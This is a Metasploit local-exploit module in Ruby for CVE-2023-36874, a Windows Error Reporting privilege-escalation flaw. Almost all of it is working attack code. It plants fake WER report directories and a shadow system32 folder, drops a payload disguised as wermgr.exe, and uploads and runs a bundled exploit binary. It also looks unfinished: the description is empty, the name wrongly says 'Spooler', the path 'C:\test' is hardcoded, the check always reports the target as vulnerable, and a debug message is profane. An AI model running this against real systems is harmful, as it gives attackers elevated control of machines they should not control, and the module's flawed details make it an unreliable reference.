##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Windows::Priv
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft Spooler Local Privilege Elevation Vulnerability',
        'Description' => %q{
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'bwatters-r7' # msf module
        ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Targets' => [
          [ 'Automatic', { 'Arch' => [ ARCH_X64 ] } ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2023-07-11',
        'References' => [
          ['CVE', '2023-36874'],
          ['URL', 'https://www.crowdstrike.com/blog/falcon-complete-zero-day-exploit-cve-2023-36874/']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ ARTIFACTS_ON_DISK, SCREEN_EFFECTS ]
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_fs_delete_file
              stdapi_sys_config_getenv
            ]
          }
        }
      )
    )

    register_options([
      OptString.new('EXPLOIT_NAME',
                    [true, 'The filename to use for the exploit binary (%RAND% by default).', "#{Rex::Text.rand_text_alpha(6..14)}.exe"]),
      OptString.new('REPORT_DIR',
                    [true, 'The Error Directory to use (%RAND% by default).', Rex::Text.rand_text_alpha(6..14).to_s]),
      OptString.new('REPORT_NAME',
                    [true, 'The Error report name (%RAND% by default).', Rex::Text.rand_text_alpha(6..14).to_s]),
      OptString.new('WRITABLE_DIR',
                    [false, 'Path to write binaries (%TEMP% by default).', nil]),
      OptInt.new('EXECUTE_DELAY',
                 [true, 'The number of seconds to delay between file upload and exploit launch', 3])
    ])
  end

  def upload_error_report
    wer_archive_dir = session.sys.config.getenv('PROGRAMDATA')
    vprint_status(wer_archive_dir)
    wer_archive_dir << '\\Microsoft\\Windows\\WER\\ReportArchive'
    report_dir = "#{wer_archive_dir}\\MyReport"
    report_filename = "#{report_dir}\\Report.wer"
    vprint_status("Creating #{report_dir}")
    mkdir(report_dir)
    wer_report_data = exploit_data('CVE-2023-36874', 'Report.wer')
    vprint_status("Writing Report to #{report_filename}")
    write_file(report_filename, wer_report_data)
  end

  def build_shadow_archive_dir(shadow_base_dir)
    wer_archive_dir = shadow_base_dir
    mkdir(wer_archive_dir)
    wer_archive_dir << '\\ProgramData\\'
    mkdir(wer_archive_dir)
    wer_archive_dir << 'Microsoft\\'
    mkdir(wer_archive_dir)
    wer_archive_dir << 'Windows\\'
    mkdir(wer_archive_dir)
    wer_archive_dir << 'WER\\'
    mkdir(wer_archive_dir)
    wer_archive_dir << 'ReportArchive\\'
    mkdir(wer_archive_dir)
    report_dir = "#{wer_archive_dir}MyReport"
    mkdir(report_dir)
    return report_dir
  end

  def upload_shadow_report(shadow_archive_dir)
    report_filename = "#{shadow_archive_dir}\\Report.wer"
    wer_report_data = exploit_data('CVE-2023-36874', 'Report.wer')
    vprint_status("Writing bad Report to #{report_filename}")
    write_file(report_filename, wer_report_data)
  end

  def build_shadow_system32(shadow_base_dir)
    shadow_win32 = "#{shadow_base_dir}\\windows"
    vprint_status("Creating #{shadow_win32}")
    mkdir(shadow_win32)
    shadow_win32 = "#{shadow_win32}\\system32"
    vprint_status("Creating #{shadow_win32}")
    mkdir(shadow_win32)
    return shadow_win32
  end

  def upload_payload(shadow_win32)
    payload_bin = generate_payload_exe
    payload_filename = "#{shadow_win32}\\wermgr.exe"
    vprint_status("Writing payload to #{payload_filename}")
    write_file(payload_filename, payload_bin)
  end

  def upload_execute_exploit(exploit_path)
    exploit_bin = exploit_data('CVE-2023-36874', 'CVE-2023-36874.exe')
    vprint_status('Fuck') if exploit_bin.nil?
    write_file(exploit_path, exploit_bin)
    sleep(5)
    vprint_status("Exploit uploaded on #{sysinfo['Computer']} to #{exploit_path}")
    output = cmd_exec('cmd.exe', "/c #{exploit_path}")
    vprint_status(output)
  end

  def validate_active_host
    print_status("Attempting to PrivEsc on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}")
  rescue Rex::Post::Meterpreter::RequestError => e
    elog('Could not connect to session', error: e)
    raise Msf::Exploit::Failed, 'Could not connect to session'
  end

  def check
    version = get_version_info
    vprint_status("OS version: #{version}")
    return Exploit::CheckCode::Appears
    # if version.build_number.between?(Msf::WindowsVersion::Win10_InitialRelease, Msf::WindowsVersion::Win10_1909)
    # return Exploit::CheckCode::Safe
  end

  def exploit
    shadow_base_dir = 'C:\test'
    # "#{session.sys.config.getenv('TEMP')}\\#{Rex::Text.rand_text_alpha(6..14)}"
    validate_active_host
    upload_error_report
    shadow_archive_dir = build_shadow_archive_dir(shadow_base_dir.dup)
    upload_shadow_report(shadow_archive_dir)
    shadow_system32 = build_shadow_system32(shadow_base_dir.dup)
    upload_payload(shadow_system32)
    sleep 20
    exploit_path = "#{shadow_base_dir}\\#{datastore['EXPLOIT_NAME']}"
    upload_execute_exploit(exploit_path)
  end
end
